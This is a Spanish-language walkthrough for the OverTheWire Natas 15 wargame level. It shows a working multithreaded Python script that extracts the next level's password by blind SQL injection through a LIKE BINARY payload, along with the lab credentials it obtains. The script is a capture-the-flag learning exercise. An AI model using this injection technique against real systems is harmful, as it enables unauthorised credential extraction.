# Natas 15

#### URL: http://natas15.natas.labs.overthewire.org
#### Credenciales: natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

Aqui necesitamos obtener la contraseña por medio de una inyección SQL, pero el programa solo nos dice que el usuario existe si el resultado de la peticion devuelve al menos una fila

``` php
if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
```

Tendremos que hacerlo a ciegas, probando caracter a caracter hasta encontrar los 32 caracteres validos de la contraseña 

Podemos tanto usar la funcion SUBSTRING como el operador LIKE con la palabra clave BINARY para hacerlo sensible a mayusculas

``` python3
from base64 import b64encode
import requests
import string
import threading
import sys

URL="http://natas15.natas.labs.overthewire.org/index.php"
headers={'Authorization':f'Basic {b64encode(b"natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx").decode()}'}
book = string.ascii_letters + string.digits
passwd = ""
threads = []

def requester(c):
        global found_char
        data = {'username':f'natas16" AND BINARY password LIKE "{passwd+c}%" -- '}
        x = requests.post(URL,headers=headers,data=data)
        if "This user exists." in x.text:
            found_char=c

for i in range(1,32+1):
    found_char=None
    for c in book:
        t = threading.Thread(target=requester,args=(c,)) 
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    if found_char:
        passwd+=found_char
        print(f"Found {found_char} ----> {passwd}")
    else:
        sys.exit(1)
print(passwd)
```

Ejecutando este script con `python3 script.py` nos da como resultado hPkjKYviLQctEW33QmuXL6eDVfMW4sGo.

`natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

PD: Uso multiples hilos en caso de ser posible para que sea mas rapido el proceso.
